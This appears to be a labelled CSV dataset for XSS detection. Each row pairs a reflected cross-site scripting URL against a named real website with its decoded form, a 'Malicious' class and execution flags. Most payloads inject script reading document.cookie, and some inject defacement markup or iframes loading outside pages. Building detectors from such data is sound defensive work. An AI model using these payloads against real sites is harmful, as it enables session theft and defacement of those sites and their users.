Payloads,Class,decoded,executed,parser_changed
https://iforgot.apple.com/cgi-bin/webobjects/dsiforgot.woa/wa/authenticate?authenticationkey=aaaaaaa<br>aaaaaaaaaaaaaaaaaaaa&amp;language='&quot;--&gt;&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"https://iforgot.apple.com/cgi-bin/webobjects/dsiforgot.woa/wa/authenticate?authenticationkey=aaaaaaaaaaaaaaaaaaaaaaaaaaa&language='""--></style></script><script>alert(document.cookie)</script>",True,True
http://www.yagmurprensi.net/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.yagmurprensi.net/igallery/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://loadgamesvf.bet365.com/f1x2games/loadgame.jsp?gameid=f1x2_football&version=1&lang=%22en&acc_id=1ec6296318cf49888464bda22a78eb2c000004&baseurl=%22);%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://loadgamesvf.bet365.com/f1x2games/loadgame.jsp?gameid=f1x2_football&version=1&lang=""en&acc_id=1ec6296318cf49888464bda22a78eb2c000004&baseurl="");</script><script>alert(document.cookie)</script>",True,True
http://www.subway.ru/users/forget_do?forget_login=&quot;&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpower/)%3<br>b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.subway.ru/users/forget_do?forget_login=""><script 
>alert(/xss by turkpower/);</script><h1>xss by turkpower</h1></marquee>",True,True
http://search.lycos.com/adv.php?query=%22%3e%3cscript%3ealert('nullflow')%3c/script%3e,Malicious,"http://search.lycos.com/adv.php?query=""><script>alert('nullflow')</script>",True,True
http://sitesearch.corriere.it/searchresults.jsp?xslurl=http%3a%2f%2fwww.corriere.it%2ftools%2fsearch<br>corriere%2ftemplateadscorriere.xsl&amp;adsenvironment=corriere&amp;channel_par=corriere&amp;num_par=0&amp;ricerca_pa<br>r=%22%3e%3cscript%3ealert%28&quot;security%20sux&quot;%29%3c%2fscript%3e&amp;numss_par=10&amp;offsetss_par=0&amp;ordss_par<br>=data&amp;numas_par=3&amp;offsetas_par=0&amp;ordas_par=data&amp;ordasdir_par=desc&amp;ad_par=w6n3&amp;adpage=1&amp;hl_par=it,Malicious,"http://sitesearch.corriere.it/searchresults.jsp?xslurl=http://www.corriere.it/tools/searchcorriere/templateadscorriere.xsl&adsenvironment=corriere&channel_par=corriere&num_par=0&ricerca_par=""><script>alert(""security sux"")</script>&numss_par=10&offsetss_par=0&ordss_par=data&numas_par=3&offsetas_par=0&ordas_par=data&ordasdir_par=desc&ad_par=w6n3&adpage=1&hl_par=it",True,True
http://www.haberturk.com/haber.asp?id=56646&amp;cat=&quot;&gt;&lt;script&gt;alert(&quot;cyber&quot;)&lt;/script&gt;,Malicious,"http://www.haberturk.com/haber.asp?id=56646&cat=""><script>alert(""cyber"")</script>",True,True
http://www6.islandrecords.com/site/search_results.php?artistsearch=%3cscript%3ealert%28%27xylitol+is<br>+back+-+hey+deryck+whibley+i+love+your+wife+lool+%3ap+-+xssed.com+for+life%27%29%3c%2fscript%3e&amp;x=27<br>&amp;y=12,Malicious,http://www6.islandrecords.com/site/search_results.php?artistsearch=<script>alert('xylitol is back - hey deryck whibley i love your wife lool :p - xssed.com for life')</script>&x=27&y=12,True,True
http://arabic-yellowpages.8k.com/eg/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%<br>3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://arabic-yellowpages.8k.com/eg/'""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://help.travian.no/index.php?type=faq&amp;mod=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b<br>%3c%2fscript%3e,Malicious,"http://help.travian.no/index.php?type=faq&mod=""><script>alert(/xss by redtuning/);</script>",True,True
http://www.tiefel-landtechnik.de/fabrikate/amazone/default.phtml?woher=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/sc<br>ript&gt;,Malicious,"http://www.tiefel-landtechnik.de/fabrikate/amazone/default.phtml?woher=""><script>alert(""maxwel"")</script>",True,True
http://1numara.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://1numara.net/directory.php?cat=""><script>alert(document.cookie)</script>",True,True
http://www.agence-europa.fr/index.php?lang=fr/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious,"http://www.agence-europa.fr/index.php?lang=fr/""><script>alert('xss by atm0n3r')</script>",True,True
http://www.jumbocorp.com/sresult.asp?q=%22+%27%3e%3cscript%3ealert(%27cueballr%27)%3c%2fscript%3e&amp;im<br>agefield.x=0&amp;imagefield.y=0,Malicious,"http://www.jumbocorp.com/sresult.asp?q="" '><script>alert('cueballr')</script>&imagefield.x=0&imagefield.y=0",True,True
http://merida.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%3c/scri<br>pt%3e,Malicious,"http://merida.tsj.gov.ve/noticias/noticia_detallada.asp?id=""><script>alert(/xssed/);</script>",True,True
http://www.independent.co.uk/search/index.jsp?eceexpr=sadsadsa&amp;ecemode=search&amp;eceform=simple&amp;ecefiel<br>d=all&amp;ecetodate=true&amp;ecefromdate=true&amp;ecefromday=1&amp;ecetoday=7&amp;ecefrommonth=0&amp;ecetomonth=3&amp;ecefromyea<br>r=1999&amp;ecetoyear=2008&amp;todaytoday=7&amp;todaytomonth=3&amp;todaytoyear=2008&amp;todayfromday=6&amp;todayfrommonth=3&amp;t<br>odayfromyear=2008&amp;last7daysfromday=30&amp;last7daysfrommonth=2&amp;last7daysfromyear=2008&amp;last30daysfromday=<br>7&amp;last30daysfrommonth=2&amp;last30daysfromyear=2008&amp;allfromday=1&amp;allfrommonth=0&amp;allfromyear=1999&amp;refinee<br>xpr=sadsadsa&amp;ecesection=1293&amp;daterange=all&amp;ecesort=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://www.independent.co.uk/search/index.jsp?eceexpr=sadsadsa&ecemode=search&eceform=simple&ecefield=all&ecetodate=true&ecefromdate=true&ecefromday=1&ecetoday=7&ecefrommonth=0&ecetomonth=3&ecefromyear=1999&ecetoyear=2008&todaytoday=7&todaytomonth=3&todaytoyear=2008&todayfromday=6&todayfrommonth=3&todayfromyear=2008&last7daysfromday=30&last7daysfrommonth=2&last7daysfromyear=2008&last30daysfromday=7&last30daysfrommonth=2&last30daysfromyear=2008&allfromday=1&allfrommonth=0&allfromyear=1999&refineexpr=sadsadsa&ecesection=1293&daterange=all&ecesort=""><script>alert(1)</script>",True,True
http://phreque.com/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://phreque.com/phpinfo.php?a[]=""><script>alert(document.cookie)</script>",True,True
"https://knowledge.mcafee.com/supportsite/dynamickc.do?externalid=nai37079&amp;sliceid=sal_public&amp;command<br>=show&amp;forward=nonthreadedkc&amp;kcid=nai37079%22;%3c/script%3e%3cimg%20src%20onerror=alert(string.fromch<br>arcode(72,97,99,107,101,114,32,83,97,102,101,63))%3e",Malicious,"https://knowledge.mcafee.com/supportsite/dynamickc.do?externalid=nai37079&sliceid=sal_public&command=show&forward=nonthreadedkc&kcid=nai37079"";</script><img src onerror=alert(string.fromcharcode(72,97,99,107,101,114,32,83,97,102,101,63))>",True,True
http://www.topgunlimousine.com/registration/freesite/register.asp?id=39667&amp;email=tglimousine@yahoo.c<br>om&amp;site=4}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee<br>%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss<br>/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.topgunlimousine.com/registration/freesite/register.asp?id=39667&email=tglimousine@yahoo.com&site=4}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>'""><marquee><h1>xss by xylitol</h1></marquee>}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://hanlin2.hbu.edu.cn/yjsh/stat/fydetal.asp?view=%22%3e%3cscript%3ealert(document.cookie)%3c/scr<br>ipt%3e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious,"http://hanlin2.hbu.edu.cn/yjsh/stat/fydetal.asp?view=""><script>alert(document.cookie)</script>><marquee><h1>meloulisi</h1></marquee>",True,True
http://support.clean-mx.de/clean-mx/viruses.php?domain=%27%22%3e%3c/title%3e%3cscript%3ealert%281337<br>%29%3c/script%3e&amp;submit=query,Malicious,"http://support.clean-mx.de/clean-mx/viruses.php?domain='""></title><script>alert(1337)</script>&submit=query",True,True
http://www.afandpa.org/template.cfm?section=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.afandpa.org/template.cfm?section=""><script>alert(""maxwel"")</script>",True,True
http://www.doaj.org/doaj?func=bytitle&amp;hybrid=&amp;query=&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;,Malicious,"http://www.doaj.org/doaj?func=bytitle&hybrid=&query=</textarea>'""><script>alert(document.cookie)</script>",True,True
http://amb.vis.ne.jp/mozilla/scrapbook/tips.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://amb.vis.ne.jp/mozilla/scrapbook/tips.php?lang=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
https://contribute.hillaryclinton.com/form.html?sc=7%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious,"https://contribute.hillaryclinton.com/form.html?sc=7""><script>alert(/xss/)</script>",True,True
http://www.turkuler.com/nota/albumler.asp?nid=3040&amp;harf=%22%3e%3cscript%3ealert(document.cookie)%3c/<br>script%3e,Malicious,"http://www.turkuler.com/nota/albumler.asp?nid=3040&harf=""><script>alert(document.cookie)</script>",True,True
http://www.chimurengalibrary.co.za/periodicals.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3<br>c/script%3e,Malicious,"http://www.chimurengalibrary.co.za/periodicals.php?id=""><script>alert(document.cookie)</script>",True,True
http://googletr.com/cars.cfm?pt=2&amp;vid=1173871212_1x02x831175274&amp;rpt=3&amp;kt=8&quot;&gt;&lt;script&gt;alert(document.c<br>ookie)&lt;/script&gt;&lt;h1&gt;by st@rext trtekforum.com&lt;/h1&gt;,Malicious,"http://googletr.com/cars.cfm?pt=2&vid=1173871212_1x02x831175274&rpt=3&kt=8""><script>alert(document.cookie)</script><h1>by st@rext trtekforum.com</h1>",True,True
http://lawebdelprogramador.com/codigo/buscar.php?buscar=ok&amp;id=13&amp;texto=c%2fvisual%2bc&amp;cadena=%3cscri<br>pt%3ealert%28%2fxss%2f%29%3b%3c%2fscript%3e&amp;x=18&amp;y=14,Malicious,http://lawebdelprogramador.com/codigo/buscar.php?buscar=ok&id=13&texto=c/visual c&cadena=<script>alert(/xss/);</script>&x=18&y=14,True,True
https://www.vodafone.ro/mydomain/shop/voda.signup.cgi?pageid=index&amp;dname=&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;,Malicious,"https://www.vodafone.ro/mydomain/shop/voda.signup.cgi?pageid=index&dname=""><script>alert(document.cookie)</script>",True,True
http://with.gseshop.co.kr/jsp/jseis_withlgeshop.jsp?media=pp&amp;gourl=http://xssed.com;msg=&lt;script&gt;alert(&quot;xssbydt&quot;)&lt;/script&gt;,Malicious,"http://with.gseshop.co.kr/jsp/jseis_withlgeshop.jsp?media=pp&gourl=http://xssed.com;msg=<script>alert(""xssbydt"")</script>",True,True
http://www.nissan.hr/hrv/page.asp?v=%22%3e%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e%3cst<br>y%20%20le%3ebody{visibility:hidden;}%20html{background-color:%20black;}%3c/style%3e'%22%3e%3cdiv%20s<br>tyle=%2%20%202position:%20absolute;left:%20420px;top:%2040px;%e2%80%8b%e2%80%8bz-index:%2010;visibil<br>ity:%20visibl%20%20e;%20color:%20white;%20font-size:%2040px;%22%3e%3cimg%20src=%22http://i28.tinypic<br>.com/1j402t.jpg%22%%20%2020style=%22height:%20400px;%20width:%20400px;%22%20alt=%22by%20sony%22%3e%3<br>cbr%3einsecurity%20romani%20%20a%3cbr%3eby%20sony%3ciframe%20src%20=http://www.youtube.com/watch?v=a<br>tziya14uv4%22%20width=%220%22%2%20%200height=%220%22%20%5c%3e%3c/div%3e,Malicious,"http://www.nissan.hr/hrv/page.asp?v=""></title><script>alert(""xss"")</script><sty  le>body{visibility:hidden;} html{background-color: black;}</style>'""><div style=%2  2position: absolute;left: 420px;top: 40px;​​z-index: 10;visibility: visibl  e; color: white; font-size: 40px;""><img src=""http://i28.tinypic.com/1j402t.jpg""%  20style=""height: 400px; width: 400px;"" alt=""by sony""><br>insecurity romani  a<br>by sony<iframe src =http://www.youtube.com/watch?v=atziya14uv4"" width=""0""%2  0height=""0"" \></div>",True,True
http://ms121.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms121.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://christoffersflorist.com/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://christoffersflorist.com/igallery34/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.maerealestate.com/middletier/errorpage.asp?fatal=0&amp;severity=3&amp;category=3&amp;eventid=3201&amp;hid<br>eresetbtn=0&amp;hidedetails=1&amp;msg=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3cscript%3ealert(<br>'norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/m<br>arquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forocibe<br>rnautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%<br>20%3c,Malicious,"http://www.maerealestate.com/middletier/errorpage.asp?fatal=0&severity=3&category=3&eventid=3201&hideresetbtn=0&hidedetails=1&msg=>""><title>norehem was here</title><script>alert('norehem was here!!')</script><h1><h1><h1><marquee>norehem was here</marquee></h1></h1></h1><center><img src=""http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif""></center><iframe src=http://jersain.iespana.es/xss.html <",True,True
http://lists.topica.com/dir/?cid=0&amp;results=none&amp;query=%22%3e%3cscript%3ealert(123)%3c%2fscript%3e%22<br>&amp;search_type=cat&amp;search_what=all,Malicious,"http://lists.topica.com/dir/?cid=0&results=none&query=""><script>alert(123)</script>""&search_type=cat&search_what=all",True,True
http://www.lds.org/portal/site/ldsorg/menuitem.062a5ea6a5e8d8661b622015f1e543a0/?vgnextoid=84010fd41<br>d93b010vgnvcm1000004d82620arcrd&amp;locale=0&amp;hidenav=1&amp;pagenumber=1&amp;maxresults=20&amp;narrow_by=&amp;query=%22%3<br>e%3cscript%3ealert%281%29%3c%2fscript%3e++&amp;bucket=allchurchcontent&amp;datefrom=&amp;dateto=&amp;author_category<br>=&amp;author_name=&amp;format=&amp;submitsearch=search&amp;datefromdisplay=&amp;datetodisplay=&amp;findbyauthor=,Malicious,"http://www.lds.org/portal/site/ldsorg/menuitem.062a5ea6a5e8d8661b622015f1e543a0/?vgnextoid=84010fd41d93b010vgnvcm1000004d82620arcrd&locale=0&hidenav=1&pagenumber=1&maxresults=20&narrow_by=&query=""><script>alert(1)</script>  &bucket=allchurchcontent&datefrom=&dateto=&author_category=&author_name=&format=&submitsearch=search&datefromdisplay=&datetodisplay=&findbyauthor=",True,True
http://www.poznanici.com/index.php?p=home&amp;error=login_error&amp;lang=sr%22%3e%3cscript%3ealert%28documen<br>t.cookie%29%3c/script%3e,Malicious,"http://www.poznanici.com/index.php?p=home&error=login_error&lang=sr""><script>alert(document.cookie)</script>",True,True
http://is.kingsoft.jp/support/faq.htm?partner=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://is.kingsoft.jp/support/faq.htm?partner=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
https://www.co.cc/regist/regist_account.php?go_url=%5c%27%3e%3cscript%3ealert%28123%29%3b%3c%2fscrip<br>t%3e,Malicious,https://www.co.cc/regist/regist_account.php?go_url=\'><script>alert(123);</script>,True,True
http://fasteditapp.faa.gov/ams/common/search.jsp?hitset=1&amp;page=1&amp;newsearch=yes&amp;displaypage=1&amp;search=<br>true&amp;textcond=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3ex<br>ss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;docuid=0,Malicious,"http://fasteditapp.faa.gov/ams/common/search.jsp?hitset=1&page=1&newsearch=yes&displaypage=1&search=true&textcond='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>&docuid=0",True,True
"http://adspecs.yahoo.fr/wp-content/plugins/spectacular/ajax.php?ys_action=addtocart&cb=0&pgid=0&prop=0>""><script>alert(document.cookie);</script>",Malicious,"http://adspecs.yahoo.fr/wp-content/plugins/spectacular/ajax.php?ys_action=addtocart&cb=0&pgid=0&prop=0>""><script>alert(document.cookie);</script>",True,True
http://tjphagan.com/middletier/errorpage.asp?fatal=0&amp;severity=3&amp;category=3&amp;eventid=3201&amp;hideresetbtn<br>=0&amp;hidedetails=1&amp;msg=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3cscript%3ealert('norehem%<br>20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marquee%3e<br>%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forocibernautica/<br>upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%20%3c,Malicious,"http://tjphagan.com/middletier/errorpage.asp?fatal=0&severity=3&category=3&eventid=3201&hideresetbtn=0&hidedetails=1&msg=>""><title>norehem was here</title><script>alert('norehem was here!!')</script><h1><h1><h1><marquee>norehem was here</marquee></h1></h1></h1><center><img src=""http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif""></center><iframe src=http://jersain.iespana.es/xss.html <",True,True
http://www.unitedspacealliance.com/search/default.asp?search=&quot;&gt;&lt;script&gt;alert(&quot;zupper&quot;)&lt;/script&gt;,Malicious,"http://www.unitedspacealliance.com/search/default.asp?search=""><script>alert(""zupper"")</script>",True,True
http://www.buono.ch/site/index.cfm?id_art=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.buono.ch/site/index.cfm?id_art=""><script>alert(""maxwel"")</script>",True,True
http://tr.888.com/site2/poker/default.htm?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://tr.888.com/site2/poker/default.htm?lang=""><script>alert(document.cookie)</script>",True,True
http://csd.toshiba.com/cgi-bin/tais/su/su_sc_domlog.jsp?cnum=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;,Malicious,"http://csd.toshiba.com/cgi-bin/tais/su/su_sc_domlog.jsp?cnum=""><script>alert(1)</script><""",True,True
http://www.hitmanslife.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,http://www.hitmanslife.com/register.php?ref='><script>alert(document.cookie);</script>,True,True
http://distance.wsu.edu/courses/catalog/index.asp?g=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://distance.wsu.edu/courses/catalog/index.asp?g=""><script>alert(""maxwel"")</script>",True,True
http://www.worldofwarcraft.com/search/searchresults.html?q=%22%3e%3cscript%3ealert%28123%29%3c/scrip<br>t%3e#pagetop,Malicious,"http://www.worldofwarcraft.com/search/searchresults.html?q=""><script>alert(123)</script>#pagetop",True,True
http://www.sicakgundem.com/search.asp?mtd=1&amp;strkey=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.sicakgundem.com/search.asp?mtd=1&strkey=""><script>alert(""backdoor"")</script>",True,True
http://www.eoma.aoac.org/methods/search.asp?string=&quot;&gt;&lt;script&gt;alert('0ssi3-xht')&lt;/script&gt;,Malicious,"http://www.eoma.aoac.org/methods/search.asp?string=""><script>alert('0ssi3-xht')</script>",True,True
http://www.suikast.de/forum.php?dil=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.suikast.de/forum.php?dil=""><script>alert(document.cookie)</script>",True,True
http://www.netshoes.com.br/busca/?q=%22%3e%3cscript%3ealert%28%22fzero%20rulez!%22%29%3c/script%3e,Malicious,"http://www.netshoes.com.br/busca/?q=""><script>alert(""fzero rulez!"")</script>",True,True
http://www.123people.fr/s/%22'%3cimg+src=.+onerror=alert('xssed_by_pierre_gardenat');+%3e,Malicious,"http://www.123people.fr/s/""'<img src=. onerror=alert('xssed_by_pierre_gardenat'); >",True,True
http://www.spectatornews.com/media/storage/paper218/news/2008/12/11/showcase/ask-anything-3577492.sh<br>tml%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3ehhhhh%3c/h<br>1%3e%3c/marquee%3e,Malicious,"http://www.spectatornews.com/media/storage/paper218/news/2008/12/11/showcase/ask-anything-3577492.shtml'""></title><script>alert(1337)</script>'""><marquee><h1>hhhhh</h1></marquee>",True,True
http://fundsforfreedom.org/igallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://fundsforfreedom.org/igallery/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
